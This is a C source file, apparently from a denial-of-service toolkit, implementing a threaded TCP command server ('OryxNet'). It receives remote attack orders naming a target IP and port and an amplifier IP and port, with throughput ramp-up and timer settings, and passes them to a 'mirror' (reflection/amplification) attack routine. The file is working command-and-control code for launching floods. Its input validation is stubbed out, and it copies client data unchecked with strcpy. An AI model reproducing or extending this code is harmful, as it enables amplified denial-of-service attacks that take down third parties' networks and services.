#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include "venus.h"
#include "commander/linderhof.h"
#include "interface/interface.h"
#include "interface/configr.h"

#define MAXPENDING 10
#define RCVBUFSIZE 2046

int serverSock = 0;
struct sockaddr_in serverAddr;

static bool validateCmd( CommandPkt p_cmd )
{
    //TODO:This function
    return true;    
}

static CommandPkt * packetToCmd( char * p_pkt )
{
    CommandPkt *cmd = NULL;  

    if( NULL == p_pkt )
    {
        //TODO:send error to client
        return NULL;
    }
    
    cmd = (CommandPkt *)p_pkt;
    
    if( !validateCmd( *cmd ) )
    {
        //TODO:send error to client
        return NULL;
    }

    return cmd;
}

static void serverInitializer( )
{
    serverSock = CreateSocket(TCP, BLOCK);

    /* Construct local address structure */
    memset(&serverAddr, 0, sizeof(serverAddr));   /* Zero out structure */
    serverAddr.sin_family = AF_INET;                /* Internet address family */
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY); /* Any incoming interface */
    serverAddr.sin_port = htons(DEFAULT_COMPORT);   /* Local port */

    /* Bind to the local address */
    if (bind(serverSock, (struct sockaddr *) &serverAddr, sizeof(serverAddr)) < 0)
    {
        Efatal(ERROR_NET, "bind() failed");
    }
  
    /* Mark the socket so it will listen for incoming connections */
    if (listen(serverSock, MAXPENDING) < 0)
    { 
        Efatal(ERROR_NET, "listen() failed");
    }
}

static ClientAddr * waitForClient()
{
    ClientAddr *cln;
    int clnSock;                    /* Socket descriptor for client */
    struct sockaddr_in clnAddr; /* Client address */
    unsigned int clnLen;            /* Length of client address data structure */
   
    if( 0 == serverSock )
    {
        serverInitializer();
    }
    clnLen = sizeof(struct sockaddr_in);

    /* Wait for a client to connect */
    if ((clnSock = accept(serverSock, (struct sockaddr *) &clnAddr, &clnLen)) < 0)
    {
        Efatal(ERROR_NET, "accept() failed");
    }
    printf("Handling client %s\n", inet_ntoa(clnAddr.sin_addr));
    
    memalloc( &cln, sizeof(ClientAddr) );
    cln->socket = clnSock;
    cln->addr.sin_addr = clnAddr.sin_addr;
    cln->addr.sin_family = clnAddr.sin_family;
    cln->addr.sin_port = clnAddr.sin_port;
    memset ( cln->addr.sin_zero ,0, sizeof(cln->addr.sin_zero) );

    return cln;
}

static LhfDraft * getAttackDraftFromCmd( CommandPkt p_cmd )
{
    LhfDraft *draft = NULL;
    LhfDraft clnDrf = (LhfDraft) p_cmd.data;
    memalloc( &draft, sizeof(LhfDraft) );
    draft->type = clnDrf.type;
    strcpy( draft->target_ip, clnDrf.target_ip );
    strcpy( draft->amp_ip, clnDrf.amp_ip );
    draft->target_port = clnDrf.target_port;
    draft->amp_port = clnDrf.amp_port;
    draft->initialThroughput = clnDrf.initialThroughput;
    draft->incrementThroughput = clnDrf.incrementThroughput;
    draft->timeFrequency = clnDrf.timeFrequency;
    draft->timer = clnDrf.timer;

    return draft;
}

static CommandPkt * getCommand( ClientAddr p_addr )
{
    char buffer[RCVBUFSIZE];        /* Buffer for echo string */
    int recvMsgSize;                    /* Size of received message */
    CommandPkt *cmd  = NULL; 
    int flags = 0;
    
    while( NULL == cmd )
    {
        /* Receive message from client */
        if ((recvMsgSize = recv(p_addr.socket, buffer, RCVBUFSIZE, flags)) < 0)
        {
            //send error to client
            continue;
        }

        if ((cmd = packetToCmd(buffer)) == NULL)
        {
            //send error to client
            continue;
        }
    }
    return cmd; 
}

static void * commandHandler( void * p_addr )
{
    ClientAddr * addr = (ClientAddr *)p_addr;
    CommandPkt * cmd = NULL;
    LhfDraft *draft;
    
    for(;;)/* Run forever */
    {
        cmd = getCommand(*addr);
        if( NULL != cmd )
        {
            switch( (int)cmd->type )
            {
                case AttackCmd:
                    draft = getAttackDraftFromCmd( *cmd );
                    int rtn;
                    if( ( ( rtn = AddMirrorAttack( *draft ) ) < 0) )
                    {
                        //TODO:send error to client
                    }
                    memfree( &draft );
                    break;
                default:
                    break;
            }
            memfree( &cmd );
        }
    }
    return NULL;
}

void OryxNet()
{
    ClientAddr *    clnAddr;  
    pthread_t threadID;

    for (;;) /* Run forever */
    {
        clnAddr = waitForClient();
        if( 0 != pthread_create(&threadID, NULL, commandHandler, clnAddr) )
        {
            //TODO:send error
        }
    }
}

void CloseOryxNet()
{
    CloseSocket(serverSock);
}
